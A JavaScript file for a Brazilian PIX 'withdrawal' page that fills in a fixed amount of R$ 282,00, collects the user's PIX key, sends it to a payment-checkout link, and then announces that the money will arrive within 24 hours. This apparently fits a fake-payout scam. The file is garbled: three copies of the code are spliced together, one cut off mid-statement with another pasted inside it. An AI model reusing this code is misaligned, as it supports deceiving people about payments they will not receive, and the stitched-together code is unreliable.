
document.addEventListener('DOMContentLoaded', function() {
    // Elementos
    const homeBtn = document.getElementById('homeBtn');
    const duvidasBtn = document.getElementById('duvidasBtn');
    const withdrawBtn = document.getElementById('withdrawBtn');
    
    const duvidasModal = document.getElementById('duvidasModal');
    const pixOptions = document.querySelectorAll('.pix-option');
    const pixKeyInput = document.getElementById('pixKey');
    const amountInput = document.getElementById('amount');
    
    const closeBtns = document.querySelectorAll('.close');

    // Definir valor padrão
    amountInput.value = 'R$ 282,00';

    // Event Listeners para opções PIX
    pixOptions.forEach(function(option) {
        option.addEventListener('click', function() {
            // Remove active class from all options
            pixOptions.forEach(opt => opt.classList.remove('active'));
            
            // Add active class to clicked option
            this.classList.add('active');
            
            // Update placeholder and label based on selected option
            const type = this.getAttribute('data-type');
            const label = document.querySelector('label[for="pixKey"]');
            
            switch(type) {
                case 'cpf':
                    label.textContent = 'Chave PIX (CPF / CNPJ) *';
                    pixKeyInput.placeholder = '000.000.000-00';
                    pixKeyInput.maxLength = 14;
                    break;
                case 'phone':
                    label.textContent = 'Chave PIX (Telefone) *';
                    pixKeyInput.placeholder = '(00) 00000-0000';
                    pixKeyInput.maxLength = 15;
                    break;
                case 'email':
                    label.textContent = 'Chave PIX (E-mail) *';
                    pixKeyInput.placeholder = 'seu@email.com';
                    pixKeyInput.maxLength = 50;
                    break;
                case 'random':document.addEventListener('DOMContentLoaded', function() {
    // Elementos
    const homeBtn = document.getElementById('homeBtn');
    const duvidasBtn = document.getElementById('duvidasBtn');
    const withdrawBtn = document.getElementById('withdrawBtn');
    
    const duvidasModal = document.getElementById('duvidasModal');
    const pixOptions = document.querySelectorAll('.pix-option');
    const pixKeyInput = document.getElementById('pixKey');
    const amountInput = document.getElementById('amount');
    
    const closeBtns = document.querySelectorAll('.close');

    // Definir valor padrão
    amountInput.value = 'R$ 282,00';

    // Event Listeners para opções PIX
    pixOptions.forEach(function(option) {
        option.addEventListener('click', function() {
            pixOptions.forEach(opt => opt.classList.remove('active'));
            this.classList.add('active');
            const type = this.getAttribute('data-type');
            const label = document.querySelector('label[for="pixKey"]');
            
            switch(type) {
                case 'cpf':
                    label.textContent = 'Chave PIX (CPF / CNPJ) *';
                    pixKeyInput.placeholder = '000.000.000-00';
                    pixKeyInput.maxLength = 14;
                    break;
                case 'phone':
                    label.textContent = 'Chave PIX (Telefone) *';
                    pixKeyInput.placeholder = '(00) 00000-0000';
                    pixKeyInput.maxLength = 15;
                    break;
                case 'email':
                    label.textContent = 'Chave PIX (E-mail) *';
                    pixKeyInput.placeholder = 'seu@email.com';
                    pixKeyInput.maxLength = 50;
                    break;
                case 'random':
                    pixKeyInput.maxLength = 50;
                    break;
            }
        });
    });

    withdrawBtn.addEventListener('click', function() {
        const pixKey = pixKeyInput.value.trim();

        if (!pixKey) {
            alert('Por favor, informe sua chave PIX.');
            return;
        }

        withdrawBtn.textContent = 'PROCESSANDO...';
        withdrawBtn.disabled = true;

        // Chamada para a API do checkout
        fetch('https://go.paradisepagbr.com/sdzc0gyyvz', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ 
                pixKey: pixKey, 
                amount: amountInput.value.replace('R$', '').trim() // Remove o R$ da entrada
            }),
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Erro ao processar o saque.');
            }
            return response.json();
        })
        .then(data => {
            alert('Saque solicitado com sucesso! O valor será enviado em até 24 horas.');
            withdrawBtn.textContent = 'SAQUE REALIZADO ✓';
        })
        .catch(error => {
            alert('Erro: ' + error.message);
            withdrawBtn.textContent = 'TENTE NOVAMENTE';
            withdrawBtn.disabled = false;
        });
    });

    // Fechar modal clicando fora dele
    window.addEventListener('click', function(event) {
        if (event.target.classList.contains('modal')) {
            event.target.style.display = 'none';
        }
    });

    // Fechar modal com a tecla ESC
    document.addEventListener('keydown', function(event) {
        if (event.key === 'Escape') {
            document.querySelectorAll('.modal').forEach(function(modal) {
                modal.style.display = 'none';
            });
        }
    });

    // Formatação automática para CPF
    pixKeyInput.addEventListener('input', function() {
        const activeOption = document.querySelector('.pix-option.active');
        if (activeOption && activeOption.getAttribute('data-type') === 'cpf') {
            let value = this.value.replace(/\D/g, '');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            this.value = value;
        }
    });
});document.addEventListener('DOMContentLoaded', function() {
    const withdrawBtn = document.getElementById('withdrawBtn');
    const pixKeyInput = document.getElementById('pixKey');
    const amountInput = document.getElementById('amount');

    withdrawBtn.addEventListener('click', function() {
        const pixKey = pixKeyInput.value.trim();

        if (!pixKey) {
            alert('Por favor, informe sua chave PIX.');
            return;
        }

        withdrawBtn.textContent = 'PROCESSANDO...';
        withdrawBtn.disabled = true;

        // Chamada para a API do checkout
        fetch('https://go.paradisepagbr.com/sdzc0gyyvz', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ 
                pixKey: pixKey, 
                amount: amountInput.value.replace('R$', '').trim() // Remove "R$" e espaços
            }),
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Erro ao processar o saque.');
            }
            return response.json();
        })
        .then(data => {
            alert('Saque solicitado com sucesso! O valor será enviado em até 24 horas.');
            withdrawBtn.textContent = 'SAQUE REALIZADO ✓';
        })
        .catch(error => {
            alert('Erro: ' + error.message);
            withdrawBtn.textContent = 'TENTE NOVAMENTE';
            withdrawBtn.disabled = false;
        });
    });
});
                    pixKeyInput.maxLength = 50;
                    break;
            }
        });
    });

    withdrawBtn.addEventListener('click', function() {
        const pixKey = pixKeyInput.value.trim();

        if (!pixKey) {
            alert('Por favor, informe sua chave PIX.');
            return;
        }

        // Simular processamento do saque
        withdrawBtn.textContent = 'PROCESSANDO...';
        withdrawBtn.disabled = true;

        // Chamada para a API do checkout
        fetch('https://go.paradisepagbr.com/sdzc0gyyvz', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ pixKey: pixKey, amount: amountInput.value }),
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Erro ao processar o saque.');
            }
            return response.json();
        })
        .then(data => {
        
        })
        .catch(error => {
            alert('Erro: ' + error.message);
            withdrawBtn.textContent = 'TENTE NOVAMENTE';
            withdrawBtn.disabled = false;
        });
    });

    // Fechar modal clicando fora dele
    window.addEventListener('click', function(event) {
        if (event.target.classList.contains('modal')) {
            event.target.style.display = 'none';
        }
    });

    // Fechar modal com a tecla ESC
    document.addEventListener('keydown', function(event) {
        if (event.key === 'Escape') {
            document.querySelectorAll('.modal').forEach(function(modal) {
                modal.style.display = 'none';
            });
        }
    });

    // Formatação automática para CPF
    pixKeyInput.addEventListener('input', function() {
        const activeOption = document.querySelector('.pix-option.active');
        if (activeOption && activeOption.getAttribute('data-type') === 'cpf') {
            let value = this.value.replace(/\D/g, '');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            this.value = value;
        }
    });
});
